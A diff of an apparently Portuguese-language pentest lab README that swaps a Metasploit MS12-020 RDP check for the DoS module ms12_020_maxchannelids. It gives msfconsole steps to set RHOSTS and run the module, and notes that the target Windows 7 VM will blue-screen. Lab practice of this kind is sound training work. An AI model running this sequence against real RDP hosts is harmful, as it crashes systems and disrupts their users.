@@ -25,20 +25,14 @@ types of network topologies and multiple LAN protocols."***
 # Metasploit 
 
 ```console
-msf > use auxiliary/scanner/rdp/ms12_020_check
+root@kali# msfconsole
 
-msf auxiliary(ms12_020_check) > show actions
-
-    ...actions...
-    
-msf auxiliary(ms12_020_check) > set ACTION < action-name >
-
-msf auxiliary(ms12_020_check) > show options
-
-    ...show and set options...
-    
-msf auxiliary(ms12_020_check) > run
+msf5 > use auxiliary/dos/windows/rdp/ms12_020_maxchannelids
+msf5 auxiliary(dos/windows/rdp/ms12_020_maxchannelids) > set RHOSTS 192.168.X.X
+msf5 auxiliary(dos/windows/rdp/ms12_020_maxchannelids) > run
 ```
+
+A máquina Windows será paralisada, causando a famosa "TELA AZUL DA MORTE"
 
 # Instalações
 Para entender como criar e instalar uma VM com o SO - Win 7, recomendo acessar o seguinte link: [https://www.comoinstalar.com.br/virtualizacao/como-instalar-o-windows-7/](https://www.comoinstalar.com.br/virtualizacao/como-instalar-o-windows-7/) 
